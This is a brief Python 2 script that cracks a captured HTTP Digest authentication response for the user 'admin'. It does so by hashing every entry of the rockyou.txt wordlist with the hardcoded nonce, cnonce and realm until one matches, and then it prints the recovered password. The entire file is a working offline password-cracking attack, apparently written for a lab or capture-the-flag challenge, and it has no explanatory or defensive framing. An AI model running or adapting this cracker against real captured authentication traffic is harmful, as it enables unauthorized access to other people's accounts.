import hashlib

cnonce = "edba216c81ec879e"
nonce = "dUASPttqBQA=7f98746b6b66730448ee30eb2cd54d36d5b9ec0c"
cnt = "00000001"
user = "admin"
realm = "Private Area"
qop = "auth"
resp = "3823c96259b479bfa6737761e0f5f1ee"
uri = "/private/"
meth = "GET"

ha2 = hashlib.md5()
ha2.update(meth.upper() + ":" + uri)
ha2hex = ha2.hexdigest()

with open("/home/raven57/Documents/rockyou.txt", "r") as worldlist:
    for pswd in worldlist:

        pswd = pswd[:-1]
        ha1 = hashlib.md5()
        ha1.update(user + ':' + realm + ':' + pswd)
        ha3 = hashlib.md5()
        ha3.update(ha1.hexdigest() + ":" + nonce + ":" + cnt + ":" + cnonce + ":" + qop + ":" + ha2hex )
        if resp == ha3.hexdigest():
            print "Password hit!"
            print 'Password = '+pswd
            break
